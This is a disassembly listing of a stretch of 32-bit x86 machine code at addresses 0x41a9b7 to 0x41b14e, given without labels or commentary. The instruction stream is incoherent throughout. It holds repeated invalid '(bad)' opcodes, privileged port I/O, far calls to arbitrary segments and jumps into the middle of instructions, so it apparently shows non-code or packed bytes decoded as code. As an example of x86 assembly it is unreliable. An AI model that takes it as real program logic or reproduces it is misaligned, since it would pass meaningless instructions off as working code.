  41a9b7:	test   ah,dl
  41a9b9:	mov    eax,0x56b97028
  41a9be:	inc    esi
  41a9bf:	(bad)  
  41a9c0:	mov    eax,0x1b2ecd42
  41a9c5:	outs   dx,DWORD PTR ds:[esi]
  41a9c6:	and    ebx,DWORD PTR [edx-0x62]
  41a9c9:	adc    cl,cl
  41a9cb:	inc    ebx
  41a9cc:	push   ds
  41a9cd:	pushf  
  41a9ce:	push   0x3585ee43
  41a9d3:	lods   eax,DWORD PTR ds:[esi]
  41a9d4:	add    DWORD PTR [edi],0x63
  41a9d7:	call   0xc48c:0x47e7f3eb
  41a9de:	dec    edx
  41a9df:	mov    ebp,esi
  41a9e1:	ja     0x41aa22
  41a9e3:	inc    esp
  41a9e4:	aam    0xe3
  41a9e6:	call   0xe5368cfa
  41a9eb:	sub    ebp,ebx
  41a9ed:	cwde   
  41a9ee:	sbb    bl,cl
  41a9f0:	out    0x63,eax
  41a9f2:	and    DWORD PTR [ebx],0xffffff9d
  41a9f5:	ja     0x41a9b0
  41a9f7:	shr    BYTE PTR [ebx+0x7f],1
  41a9fa:	inc    edi
  41a9fb:	mov    edx,0x4791d0c8
  41aa00:	or     al,dl
  41aa02:	cmc    
  41aa03:	pop    edi
  41aa04:	jno    0x41aa20
  41aa06:	pusha  
  41aa07:	sub    DWORD PTR ds:0x8492b70d,ebx
  41aa0d:	sbb    BYTE PTR [ebp+0x14],0x8a
  41aa11:	stc    
  41aa12:	enter  0xe94a,0x6b
  41aa16:	pop    eax
  41aa17:	inc    esp
  41aa18:	enter  0xcc63,0x28
  41aa1c:	(bad)  
  41aa1d:	nop
  41aa1e:	xor    ch,BYTE PTR [edx+0x76]
  41aa21:	push   ecx
  41aa22:	ins    DWORD PTR es:[edi],dx
  41aa23:	mov    ebx,0x5923c663
  41aa28:	aam    0x88
  41aa2a:	sbb    al,0x7c
  41aa2c:	je     0x41aa22
  41aa2e:	inc    ecx
  41aa2f:	fs dec eax
  41aa31:	out    0xd0,al
  41aa33:	bound  ebx,QWORD PTR [ecx-0x178575bf]
  41aa39:	or     BYTE PTR [esi-0x5afb8476],dh
  41aa3f:	retf   0x8131
  41aa42:	into   
  41aa43:	jns    0x41aa1b
  41aa45:	out    0x40,eax
  41aa47:	mov    ds:0x61ee6a2a,eax
  41aa4c:	out    0x76,eax
  41aa4e:	fistp  DWORD PTR [esi]
  41aa50:	pop    ebp
  41aa51:	call   0xf405:0x5721de99
  41aa58:	fsubr  DWORD PTR [edx]
  41aa5a:	out    0xf2,al
  41aa5c:	add    DWORD PTR [esi+ebx*4-0x3ba7a25d],ebp
  41aa63:	ins    BYTE PTR es:[edi],dx
  41aa64:	sub    eax,0x9df0f5fa
  41aa69:	and    al,0xd
  41aa6b:	aas    
  41aa6c:	xchg   esp,eax
  41aa6d:	or     edi,DWORD PTR [eax-0x35]
  41aa70:	mov    ch,0x32
  41aa72:	xchg   edi,eax
  41aa73:	lods   al,BYTE PTR ds:[esi]
  41aa74:	ss fwait
  41aa76:	cmp    al,ch
  41aa78:	mov    edx,0x7dbf2cd3
  41aa7d:	in     eax,0x32
  41aa7f:	adc    eax,0xb4208b33
  41aa84:	sbb    ah,BYTE PTR [eax]
  41aa86:	xor    al,0x55
  41aa88:	fs dec ebx
  41aa8a:	cwde   
  41aa8b:	push   cs
  41aa8c:	and    BYTE PTR [ebx+0x46],0x39
  41aa90:	fst    QWORD PTR es:0xf871d2d
  41aa97:	popa   
  41aa98:	dec    ebp
  41aa99:	pop    esp
  41aa9a:	int3   
  41aa9b:	dec    ecx
  41aa9c:	mov    cs,edx
  41aa9e:	jns    0x41aae1
  41aaa0:	pop    ecx
  41aaa1:	add    DWORD PTR [edx+0x4560c404],0x441d1251
  41aaab:	stos   DWORD PTR es:[edi],eax
  41aaac:	clc    
  41aaad:	lods   al,BYTE PTR ds:[esi]
  41aaae:	or     al,0x11
  41aab0:	mov    ebx,0x16a36590
  41aab5:	ins    BYTE PTR es:[edi],dx
  41aab6:	call   0x6a1b:0xc640b64d
  41aabd:	xchg   BYTE PTR [edx-0x90e939f],ah
  41aac3:	mov    esi,0x2b9f1bb
  41aac8:	icebp  
  41aac9:	ret    0x336a
  41aacc:	les    eax,FWORD PTR [eax+0x4d]
  41aacf:	shr    dl,0xf9
  41aad2:	sbb    al,0xa
  41aad4:	(bad)  
  41aad5:	mov    dh,0x99
  41aad7:	int    0x62
  41aad9:	add    BYTE PTR [ecx],ah
  41aadb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aadc:	fidiv  WORD PTR [eax+0x391bf0f1]
  41aae2:	dec    ecx
  41aae3:	fst    DWORD PTR [ebp+0x1ae95a4d]
  41aae9:	jecxz  0x41ab29
  41aaeb:	xchg   ecx,eax
  41aaec:	mov    eax,ds:0xdf63a366
  41aaf1:	test   eax,0xddc59250
  41aaf6:	ret    
  41aaf7:	mov    dh,0xbc
  41aaf9:	mov    ebp,0xe96241ec
  41aafe:	arpl   cx,bx
  41ab00:	mov    eax,0xb1bc85e4
  41ab05:	cmp    ebx,ecx
  41ab07:	jo     0x41ab0e
  41ab09:	adc    BYTE PTR [esi],0x13
  41ab0c:	jnp    0x41aac8
  41ab0e:	ins    BYTE PTR es:[edi],dx
  41ab0f:	mov    bh,0x67
  41ab11:	adc    eax,0x7a31911c
  41ab16:	dec    edi
  41ab17:	push   ds
  41ab18:	sub    ah,bl
  41ab1a:	shl    BYTE PTR [edx+0x4447a96],0x34
  41ab21:	xor    BYTE PTR [esp+ebx*2+0x68],cl
  41ab25:	fucomp st(4)
  41ab27:	fcmovbe st,st(2)
  41ab29:	mov    BYTE PTR [esi],bl
  41ab2b:	xor    eax,ebx
  41ab2d:	test   eax,0xb32e0ea8
  41ab32:	jl     0x41ab0a
  41ab34:	xor    al,0x28
  41ab36:	inc    eax
  41ab37:	clc    
  41ab38:	push   cs
  41ab39:	add    DWORD PTR [ebx+edx*2-0x6a0fdeb8],0x1da71b76
  41ab44:	sub    eax,0x2e8d6971
  41ab49:	loope  0x41ab18
  41ab4b:	fidivr WORD PTR [ebx-0x129c45f]
  41ab51:	and    al,0x37
  41ab53:	inc    eax
  41ab54:	fld    st(5)
  41ab56:	(bad)  
  41ab57:	fcom   DWORD PTR [edx+ebx*2]
  41ab5a:	icebp  
  41ab5b:	pop    eax
  41ab5c:	fs pop ebp
  41ab5e:	not    dl
  41ab60:	inc    esp
  41ab61:	mov    cs,WORD PTR [edi-0x643ffdd]
  41ab67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab68:	push   eax
  41ab69:	out    0xc4,al
  41ab6b:	jmp    0x41abb1
  41ab6d:	jl     0x41ab24
  41ab6f:	cwde   
  41ab70:	cli    
  41ab71:	shl    DWORD PTR [edi+edi*8+0x648bfb26],0x19
  41ab79:	dec    ebx
  41ab7a:	or     ch,0xe0
  41ab7d:	mov    ecx,0x69800602
  41ab82:	xchg   ecx,eax
  41ab83:	pop    esp
  41ab85:	bound  ebx,QWORD PTR [esi]
  41ab87:	(bad)  
  41ab88:	iret   
  41ab89:	dec    ebp
  41ab8a:	inc    edi
  41ab8b:	mov    al,0x4
  41ab8d:	stc    
  41ab8e:	out    0xf6,al
  41ab90:	lock aas 
  41ab92:	std    
  41ab93:	pop    ebp
  41ab94:	or     BYTE PTR [ebp+0x3f],bl
  41ab97:	jmp    DWORD PTR [edx]
  41ab99:	loopne 0x41ab73
  41ab9b:	repz lea ebx,[esi+eiz*2+0x13]
  41aba0:	aas    
  41aba1:	push   cs
  41aba2:	ror    BYTE PTR [ebp-0x446caef8],0x1f
  41aba9:	icebp  
  41abaa:	mov    edx,0x3713ffec
  41abaf:	jno    0x41ac04
  41abb1:	imul   edi,DWORD PTR [eax+0x4],0x4
  41abb5:	or     BYTE PTR [edx+eax*8+0x474a03d1],ah
  41abbc:	fnstsw WORD PTR [edi+0x75d76811]
  41abc2:	push   esp
  41abc3:	mov    dh,0x20
  41abc5:	pop    edi
  41abc6:	scas   eax,DWORD PTR es:[edi]
  41abc7:	sub    esp,DWORD PTR [edi-0x60313a01]
  41abcd:	pop    edx
  41abce:	mov    dh,0x8
  41abd0:	loop   0x41ac18
  41abd2:	xchg   ecx,eax
  41abd3:	or     edi,ecx
  41abd5:	or     BYTE PTR [eax],al
  41abd7:	in     eax,0xc5
  41abd9:	push   esp
  41abda:	jp     0x41abf8
  41abdc:	fwait
  41abdd:	call   0x73bca73d
  41abe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abe3:	shld   esp,edx,0xad
  41abe7:	push   ss
  41abe8:	sbb    BYTE PTR [edi-0x29],bl
  41abeb:	xor    eax,0x6925a43f
  41abf0:	addr16 mov bh,0x95
  41abf3:	mov    ebx,0xfc3e2c75
  41abf8:	mov    edx,0x72fc7465
  41abfd:	jae    0x41aba3
  41abff:	lods   al,BYTE PTR ds:[esi]
  41ac00:	push   esi
  41ac01:	and    al,0xb8
  41ac03:	xchg   edx,eax
  41ac04:	gs jbe 0x41ac0d
  41ac07:	mov    ds:0x4b95d54e,eax
  41ac0c:	mov    DWORD PTR [ecx+0x37],edx
  41ac0f:	das    
  41ac10:	xor    ch,BYTE PTR [edx+0x36]
  41ac13:	lea    edx,[eax-0x11b9fa74]
  41ac19:	jmp    0x9aa3:0xdd489437
  41ac20:	rcl    BYTE PTR [esi],cl
  41ac22:	addr16 jmp 0x25597198
  41ac28:	mov    ebp,DWORD PTR [ebx-0x5666b8ca]
  41ac2e:	leave  
  41ac2f:	push   ds
  41ac30:	xchg   esi,eax
  41ac31:	test   eax,0xc8a11eac
  41ac36:	push   cs
  41ac37:	jecxz  0x41abdd
  41ac39:	mov    dl,0xdf
  41ac3b:	retf   0xf4d3
  41ac3e:	adc    BYTE PTR [ecx],dh
  41ac40:	fcomp  QWORD PTR [ebx]
  41ac42:	imul   eax,ebx,0xffffffa6
  41ac45:	dec    edi
  41ac46:	test   ecx,ebp
  41ac48:	mov    edi,0xc80ba3a2
  41ac4d:	mov    WORD PTR [eax+0x62],?
  41ac50:	clc    
  41ac51:	popf   
  41ac52:	out    0x78,eax
  41ac54:	loopne 0x41ac89
  41ac56:	jl     0x41acc8
  41ac58:	adc    DWORD PTR [eax-0x3c],ebx
  41ac5b:	mov    ah,0xff
  41ac5d:	stos   DWORD PTR es:[edi],eax
  41ac5e:	ja     0x41ac5b
  41ac60:	xlat   BYTE PTR ds:[ebx]
  41ac61:	(bad)  
  41ac62:	jp     0x41ac00
  41ac64:	fs dec edi
  41ac66:	(bad)  
  41ac67:	movsx  edi,bh
  41ac6a:	dec    esi
  41ac6b:	push   ebx
  41ac6c:	loope  0x41ac6e
  41ac6e:	dec    ebp
  41ac6f:	das    
  41ac70:	and    bh,BYTE PTR [edx-0x6d]
  41ac73:	ja     0x41abff
  41ac75:	inc    esi
  41ac76:	and    al,0xb
  41ac78:	cmc    
  41ac79:	lods   al,BYTE PTR ds:[esi]
  41ac7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac7b:	jmp    FWORD PTR [eax+0x4e]
  41ac7e:	jmp    0x48f35f03
  41ac83:	clc    
  41ac84:	xlat   BYTE PTR ds:[ebx]
  41ac85:	jp     0x41ac82
  41ac87:	sub    ebp,DWORD PTR [ecx]
  41ac89:	cwde   
  41ac8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac8b:	and    dh,BYTE PTR [edx]
  41ac8d:	lea    esi,[edx+ebp*1+0x4e]
  41ac91:	mov    edx,0x671377c1
  41ac96:	pusha  
  41ac97:	scas   eax,DWORD PTR es:[edi]
  41ac98:	push   ecx
  41ac99:	sahf   
  41ac9a:	push   ecx
  41ac9b:	popf   
  41ac9c:	(bad)  
  41ac9d:	rol    edx,1
  41ac9f:	jmp    0x41ace5
  41aca1:	retf   
  41aca2:	cmp    eax,0x418b985d
  41aca7:	mov    al,ds:0x4a9dd288
  41acac:	test   al,0xad
  41acae:	mov    ebp,0x4966d6a7
  41acb3:	test   DWORD PTR [edx+0x19],0xf7279273
  41acba:	adc    bh,BYTE PTR [ebx+0x33]
  41acbd:	icebp  
  41acbe:	sbb    ebx,DWORD PTR [esi-0x1a7265f3]
  41acc4:	retf   0x2822
  41acc7:	xchg   ecx,eax
  41acc8:	rcr    BYTE PTR [edi],0xd
  41accb:	xor    bl,BYTE PTR [ebx+eax*4-0x28]
  41accf:	push   ecx
  41acd0:	jae    0x41ac90
  41acd2:	mov    ebx,0x9559b955
  41acd7:	dec    esi
  41acd8:	xchg   edi,eax
  41acd9:	add    eax,0xe19cacf8
  41acde:	xchg   edx,eax
  41acdf:	out    0x7e,al
  41ace1:	out    0x76,eax
  41ace3:	shr    edi,cl
  41ace5:	jbe    0x41ad64
  41ace7:	inc    esp
  41ace8:	jae    0x41acc5
  41acea:	outs   dx,DWORD PTR ds:[esi]
  41aceb:	xchg   esi,eax
  41acec:	dec    edi
  41aced:	pop    edx
  41acee:	mov    dl,0x39
  41acf0:	dec    eax
  41acf1:	mov    dl,0x7d
  41acf3:	inc    ecx
  41acf4:	fs aaa 
  41acf6:	pop    edi
  41acf7:	in     eax,dx
  41acf8:	hlt    
  41acf9:	sbb    BYTE PTR ds:0x205b7d3d,cl
  41acff:	popf   
  41ad00:	push   cs
  41ad01:	sbb    ah,dh
  41ad03:	out    0xb3,eax
  41ad05:	lods   eax,DWORD PTR ds:[esi]
  41ad06:	sbb    dh,BYTE PTR [ebp+ebp*8-0x6a45274]
  41ad0d:	addr16 sub edx,esp
  41ad10:	adc    esi,DWORD PTR [edi-0x4e]
  41ad13:	mov    esi,edx
  41ad15:	pop    edi
  41ad16:	addr16 mov esi,0xca9ece50
  41ad1c:	outs   dx,BYTE PTR ds:[esi]
  41ad1d:	add    esp,DWORD PTR [eax+0x11]
  41ad20:	xlat   BYTE PTR ds:[ebx]
  41ad21:	nop
  41ad22:	xor    al,0x78
  41ad24:	push   es
  41ad25:	(bad)  
  41ad26:	sbb    cl,BYTE PTR [eax-0x41d52de5]
  41ad2c:	in     eax,0x1d
  41ad2e:	and    ch,BYTE PTR [ecx+ecx*8-0x6ae418b6]
  41ad35:	mov    ebx,0x1cec3b7a
  41ad3a:	or     al,0x96
  41ad3c:	sbb    BYTE PTR [ecx],dl
  41ad3e:	icebp  
  41ad3f:	and    DWORD PTR [esp+esi*8-0x10c91cab],ebx
  41ad46:	(bad)  
  41ad47:	fcomp  DWORD PTR [edx-0x75f8b39a]
  41ad4d:	pop    ebx
  41ad4e:	dec    esi
  41ad4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad50:	dec    edx
  41ad51:	add    esp,ecx
  41ad53:	stc    
  41ad54:	mov    eax,0xe2fd99ec
  41ad59:	mov    ch,0x5b
  41ad5c:	retf   
  41ad5d:	jp     0x41add0
  41ad5f:	shr    DWORD PTR [ebx],0xe8
  41ad62:	mov    al,0xbd
  41ad64:	xchg   DWORD PTR [edi-0x2f04e3e4],eax
  41ad6a:	inc    edx
  41ad6b:	into   
  41ad6c:	rcl    dh,0x79
  41ad6f:	mov    esp,0x8958c6e8
  41ad74:	clc    
  41ad75:	pop    esi
  41ad76:	push   edi
  41ad77:	sahf   
  41ad78:	clc    
  41ad79:	mov    bl,0x5f
  41ad7b:	cmp    al,0xcb
  41ad7d:	ficomp WORD PTR [esi+edi*1-0x11503ab2]
  41ad84:	(bad)  
  41ad85:	and    esp,DWORD PTR [eax]
  41ad87:	xor    bl,al
  41ad89:	and    BYTE PTR [edx-0x238cc1b3],ah
  41ad8f:	lea    edx,[edi]
  41ad91:	jl     0x41ade1
  41ad93:	dec    ebp
  41ad94:	cwde   
  41ad95:	inc    esi
  41ad96:	out    dx,eax
  41ad97:	outs   dx,DWORD PTR ds:[esi]
  41ad98:	ss aad 0xb4
  41ad9b:	jmp    0x507b:0x3c9c34d8
  41ada2:	mov    edx,0x12c45ddc
  41ada7:	dec    ebx
  41ada8:	nop
  41ada9:	mov    bh,0x72
  41adab:	and    BYTE PTR [esi+0x8],bl
  41adae:	rcr    DWORD PTR [edi+0x706328bb],1
  41adb4:	push   0x69
  41adb6:	and    al,0x18
  41adb8:	jmp    0x5d13:0xf93c0f1a
  41adbf:	dec    ecx
  41adc0:	clc    
  41adc1:	xor    eax,DWORD PTR [esi]
  41adc3:	add    esp,ebx
  41adc5:	daa    
  41adc6:	popf   
  41adc7:	faddp  st(2),st
  41adc9:	and    dl,BYTE PTR [edx+eiz*1]
  41adcc:	jae    0x41ad84
  41adce:	xchg   DWORD PTR [eax+ebp*1-0xaeed897],esp
  41add5:	iret   
  41add6:	imul   eax,DWORD PTR [esi-0x29],0xc5b78b31
  41addd:	mov    ecx,0x8e902457
  41ade2:	mov    al,ds:0xa620d3eb
  41ade7:	xchg   BYTE PTR [ebx+0x76461c8e],al
  41aded:	inc    esi
  41adee:	mov    al,0x73
  41adf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adf1:	lds    esp,FWORD PTR [esi]
  41adf3:	jmp    0x41adb2
  41adf5:	jmp    0x41ae3a
  41adf7:	icebp  
  41adf8:	cmp    DWORD PTR [ebx-0x18],edx
  41adfb:	jecxz  0x41add2
  41adfd:	and    eax,DWORD PTR [edi+0x5]
  41ae00:	imul   ebx,DWORD PTR [edx+0x60],0x4d
  41ae04:	(bad)  
  41ae06:	dec    ebp
  41ae07:	push   es
  41ae08:	lahf   
  41ae09:	or     bl,BYTE PTR [edi+0x5c]
  41ae0c:	mov    ebp,eax
  41ae0e:	out    0xfc,eax
  41ae10:	shr    BYTE PTR [edi],cl
  41ae12:	test   DWORD PTR [ebp+edx*1-0x36],esp
  41ae16:	xchg   edx,eax
  41ae17:	mov    ebx,DWORD PTR [ecx+0xeb1b22b]
  41ae1d:	jae    0x41ae81
  41ae1f:	fstp   TBYTE PTR [edx-0x44]
  41ae22:	mov    edi,0x516bc0fc
  41ae27:	jle    0x41ae7f
  41ae29:	sub    eax,0x169e8bb5
  41ae2e:	fistp  DWORD PTR [esi-0x5a]
  41ae31:	mov    esp,0x8e1115fb
  41ae36:	sub    al,0xd0
  41ae38:	push   esi
  41ae39:	inc    ecx
  41ae3a:	mov    dl,0xa8
  41ae3c:	push   ss
  41ae3d:	dec    ebp
  41ae3e:	xchg   edi,esi
  41ae40:	out    dx,al
  41ae41:	je     0x41aead
  41ae43:	cmp    DWORD PTR ds:0xe7918a5b,edi
  41ae49:	in     al,dx
  41ae4a:	jmp    0xea40bf7a
  41ae4f:	or     DWORD PTR [eax+0x4a],ebp
  41ae52:	mov    ecx,0xedd1d08f
  41ae57:	imul   esi,DWORD PTR ds:0xaed25859,0xffffffcf
  41ae5e:	inc    esp
  41ae5f:	mov    ebp,0x4d40e52b
  41ae64:	jo     0x41ae1c
  41ae66:	dec    eax
  41ae67:	sar    DWORD PTR [ebx+0x17],cl
  41ae6a:	adc    BYTE PTR [eax+0x5a],0x81
  41ae6e:	stos   BYTE PTR es:[edi],al
  41ae6f:	pop    eax
  41ae70:	out    0x43,eax
  41ae72:	sahf   
  41ae73:	cmp    eax,0xf1ada91f
  41ae78:	adc    BYTE PTR [ebp-0x1c],0x55
  41ae7c:	push   es
  41ae7d:	rcl    BYTE PTR [ebp-0x2cc4b0b2],1
  41ae83:	ins    BYTE PTR es:[edi],dx
  41ae84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae85:	and    ch,BYTE PTR [esi]
  41ae87:	and    eax,0xacfad396
  41ae8c:	sub    DWORD PTR [ebx],eax
  41ae8e:	ins    DWORD PTR es:[edi],dx
  41ae8f:	sub    DWORD PTR [edi-0x24ecb19e],0x6e5cdb25
  41ae99:	sub    DWORD PTR [ecx+edx*2-0x427a0f08],0x16
  41aea1:	or     esp,DWORD PTR [esi-0x5a4f899b]
  41aea7:	mov    ebx,0x61d787b7
  41aeac:	call   0x9f6d:0xb78bf9e2
  41aeb3:	mov    esp,0xd022257
  41aeb8:	pop    es
  41aeb9:	(bad)  
  41aebb:	ficomp WORD PTR [edx+0x19]
  41aebf:	xchg   ebp,ecx
  41aec1:	adc    DWORD PTR [esi-0x6100b6bf],0x34511b5a
  41aecb:	dec    edi
  41aecc:	ret    
  41aecd:	div    BYTE PTR [edx-0x23b4a0b5]
  41aed3:	adc    cl,bh
  41aed5:	xor    eax,0xe9957be9
  41aeda:	jb     0x41ae94
  41aedc:	push   eax
  41aedd:	sbb    DWORD PTR [esi],esi
  41aedf:	leave  
  41aee0:	in     eax,0x51
  41aee2:	retf   0xee4b
  41aee5:	sub    edi,DWORD PTR [eax]
  41aee7:	popf   
  41aee8:	ficomp DWORD PTR [eax]
  41aeea:	rcr    DWORD PTR [ebx],0x56
  41aeed:	inc    edi
  41aeee:	std    
  41aeef:	pop    esi
  41aef0:	mov    esp,0x18e52a1b
  41aef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aef6:	xchg   ebp,eax
  41aef7:	mov    esp,0x4e16d67f
  41aefc:	mov    dh,0xda
  41aefe:	fild   WORD PTR [ebp+esi*8-0x74883852]
  41af05:	cmp    eax,0xc90ec0c7
  41af0a:	sbb    eax,0x3955ccae
  41af0f:	cmc    
  41af10:	nop
  41af11:	push   cs
  41af12:	sbb    DWORD PTR [ebp+0x7de4118d],eax
  41af18:	mov    esi,0xf0956216
  41af1d:	ja     0x41aec1
  41af1f:	aaa    
  41af20:	jno    0x41aefc
  41af22:	inc    edi
  41af23:	cmp    BYTE PTR [esi-0x51],dl
  41af26:	cmp    BYTE PTR [eax+0x62],dh
  41af29:	pop    esp
  41af2a:	xchg   edx,eax
  41af2b:	pop    esi
  41af2c:	xchg   esi,eax
  41af2d:	push   edx
  41af2e:	fwait
  41af2f:	dec    ebx
  41af30:	cs movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41af33:	jge    0x41af78
  41af35:	adc    BYTE PTR [edx],ch
  41af37:	mov    bh,0x1b
  41af39:	fild   DWORD PTR [edx+0x17743874]
  41af3f:	adc    edi,0xffffff8d
  41af42:	adc    eax,0x2276dd64
  41af47:	sbb    DWORD PTR [ecx],esp
  41af49:	xchg   edx,eax
  41af4a:	adc    eax,0xb85d0dc4
  41af4f:	cmp    DWORD PTR [eax-0x66],edx
  41af52:	sar    BYTE PTR [edx+0x53e65d5b],1
  41af58:	test   eax,0x21e39645
  41af5d:	inc    ecx
  41af5e:	popf   
  41af5f:	inc    ebx
  41af60:	mov    ds:0xa8dc32ab,eax
  41af65:	arpl   WORD PTR [ebp+0x1bbf9027],ax
  41af6b:	adc    al,0x13
  41af6d:	sub    eax,0xbec4b7c7
  41af72:	and    eax,0xf3abc3ed
  41af78:	mov    ecx,0xf2f03a27
  41af7d:	add    al,BYTE PTR [ebx+0x67]
  41af80:	clc    
  41af81:	mov    ebp,0x9290d051
  41af86:	mov    ecx,DWORD PTR [ecx+eiz*2]
  41af89:	scas   al,BYTE PTR es:[edi]
  41af8a:	loop   0x41af95
  41af8c:	mov    bl,0xcc
  41af8e:	lds    ecx,FWORD PTR [ebx+ecx*2]
  41af91:	jae    0x41afc0
  41af93:	aam    0xd9
  41af95:	dec    ebx
  41af96:	stos   BYTE PTR es:[edi],al
  41af97:	pop    esi
  41af98:	stc    
  41af99:	clc    
  41af9a:	fs mov ecx,0xf14e684f
  41afa0:	xchg   edx,eax
  41afa1:	push   ds
  41afa2:	rcr    BYTE PTR [esi+0x77],1
  41afa5:	int    0xc3
  41afa7:	adc    esi,DWORD PTR [edi+0x6d]
  41afaa:	mov    ebp,0xda28b9ce
  41afaf:	fst    DWORD PTR [esi+0x7d8e5229]
  41afb5:	fnstenv [ebx]
  41afb7:	lock and al,0x93
  41afba:	jl     0x41af79
  41afbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afbd:	fadd   DWORD PTR [esp-0x55c82d0a]
  41afc4:	(bad)  
  41afc5:	sti    
  41afc6:	mov    al,0xd9
  41afc8:	std    
  41afc9:	lea    edi,[ebp-0x253faf38]
  41afcf:	jmp    0x2e93:0xe52b3d81
  41afd6:	fst    DWORD PTR [ebp-0x5cad86fc]
  41afdc:	test   DWORD PTR [esi-0x6517ebfd],eax
  41afe2:	xchg   edi,eax
  41afe3:	rcr    dl,0xb8
  41afe6:	pop    edx
  41afe7:	inc    eax
  41afe8:	mov    eax,ds:0xcf6ddf70
  41afed:	jecxz  0x41b032
  41afef:	jmp    0x9cb76580
  41aff4:	pop    ebp
  41aff5:	mov    bh,0xfe
  41aff7:	dec    eax
  41aff8:	dec    eax
  41aff9:	loop   0x41afc8
  41affb:	adc    eax,0xe62963a5
  41b000:	loopne 0x41b036
  41b002:	mov    eax,0xac26f509
  41b007:	stos   BYTE PTR es:[edi],al
  41b008:	cmp    BYTE PTR [edi-0x11ce675a],0xd2
  41b00f:	jnp    0x41b03a
  41b011:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b012:	or     BYTE PTR [ecx-0x30a84774],bl
  41b018:	pop    ebx
  41b019:	imul   eax,DWORD PTR [ebp-0x36],0x9fb812e6
  41b020:	and    eax,esi
  41b022:	ret    0x108c
  41b025:	mov    esi,0x747373a9
  41b02a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b02b:	mov    dh,dh
  41b02d:	push   0x11819e95
  41b032:	mov    bl,BYTE PTR [esi+edi*8-0x24]
  41b036:	stc    
  41b037:	mov    ch,0x6a
  41b039:	arpl   bx,bx
  41b03b:	stos   DWORD PTR es:[edi],eax
  41b03c:	dec    edi
  41b03d:	mov    cl,0xca
  41b03f:	mov    ds:0xfbfab16,eax
  41b044:	adc    DWORD PTR [edi+ecx*8],0x777637ef
  41b04b:	arpl   WORD PTR [edi],dx
  41b04d:	sub    ah,BYTE PTR [ecx]
  41b04f:	pushf  
  41b050:	sub    DWORD PTR [ebx],ecx
  41b052:	ret    
  41b053:	popa   
  41b054:	inc    ecx
  41b055:	push   esp
  41b056:	jno    0x41b03f
  41b058:	(bad)  
  41b059:	jp     0x41b0ad
  41b05b:	cmc    
  41b05c:	popa   
  41b05d:	neg    DWORD PTR [edi-0x3e2c3a6]
  41b063:	dec    ebx
  41b064:	jbe    0x41b075
  41b066:	push   edi
  41b067:	shr    DWORD PTR [ecx-0x19aab08b],1
  41b06d:	nop
  41b06e:	inc    edx
  41b06f:	mov    ch,0xbc
  41b071:	jb     0x41b08d
  41b073:	mov    edi,esi
  41b075:	icebp  
  41b076:	jne    0x41b002
  41b078:	inc    ecx
  41b079:	xor    DWORD PTR [edx+0x28],ebx
  41b07c:	xchg   ebx,eax
  41b07d:	and    ch,BYTE PTR [ebx]
  41b07f:	div    dl
  41b081:	inc    esp
  41b082:	or     esi,DWORD PTR [eax-0xa]
  41b085:	test   eax,0x7865355f
  41b08a:	sub    edx,ebx
  41b08c:	mov    al,ds:0x6c243a
  41b091:	jge    0x41b105
  41b093:	xchg   ebx,eax
  41b094:	sbb    ch,BYTE PTR ds:0x9ba38aca
  41b09a:	lds    ebp,FWORD PTR [edx+0x4e]
  41b09d:	xchg   edi,eax
  41b09e:	retf   
  41b09f:	mov    ?,WORD PTR [edi+0x719407fa]
  41b0a5:	lock sbb DWORD PTR [ebx+0x3adcb1ca],0xffffff82
  41b0ad:	cmc    
  41b0ae:	out    dx,eax
  41b0af:	iret   
  41b0b0:	mov    DWORD PTR [esi],esp
  41b0b2:	jle    0x41b11c
  41b0b4:	sbb    DWORD PTR [eax+0x6c],ebx
  41b0b7:	add    DWORD PTR [ecx+0x89f0774],edx
  41b0bd:	add    eax,0x27dd7505
  41b0c2:	dec    edi
  41b0c3:	(bad)  
  41b0c4:	sub    ch,BYTE PTR [esi-0x32]
  41b0c7:	cwde   
  41b0c8:	call   0xdad2:0xf18cc871
  41b0cf:	xchg   ebx,eax
  41b0d0:	(bad)  [eax+0x6d]
  41b0d3:	pop    ebx
  41b0d4:	or     BYTE PTR [eax],0xce
  41b0d7:	xchg   edi,eax
  41b0d8:	push   esp
  41b0d9:	add    esi,0x5d7358b3
  41b0df:	push   ebp
  41b0e0:	xor    eax,0xf6bcbc4b
  41b0e5:	mov    ch,0x24
  41b0e7:	cli    
  41b0e8:	cmp    dh,BYTE PTR [ebx]
  41b0ea:	jnp    0x41b136
  41b0ec:	test   eax,0xd313dea
  41b0f1:	enter  0x364,0xec
  41b0f5:	jnp    0x41b143
  41b0f7:	sub    edx,DWORD PTR [eax-0x13]
  41b0fa:	jge    0x41b137
  41b0fc:	adc    cl,BYTE PTR [eax-0x2a99a573]
  41b102:	stos   BYTE PTR es:[edi],al
  41b103:	adc    ebp,DWORD PTR ds:0x734d32e5
  41b109:	push   esp
  41b10a:	and    al,0x41
  41b10c:	fist   WORD PTR ds:[esi-0x5c]
  41b110:	inc    esi
  41b111:	inc    esp
  41b112:	test   eax,0x13bbfe3f
  41b117:	scas   al,BYTE PTR es:[edi]
  41b118:	push   ebx
  41b119:	inc    esp
  41b11a:	popa   
  41b11b:	call   0x35c3012f
  41b120:	leave  
  41b121:	sub    BYTE PTR [esi+0x79],cl
  41b124:	retf   
  41b125:	les    esi,FWORD PTR [edi-0x57e60eec]
  41b12b:	fs or  eax,0xadeb367b
  41b131:	inc    ecx
  41b132:	fimul  WORD PTR [edi-0x24056ec9]
  41b138:	mov    ebx,0x2a32282c
  41b13d:	mov    gs,WORD PTR [ecx+0x71eaf8cf]
  41b143:	xor    al,0xb1
  41b145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b146:	or     al,0x9d
  41b148:	addr16 into 
  41b14a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b14b:	push   esi
  41b14c:	jg     0x41b10f
  41b14e:	push   ss
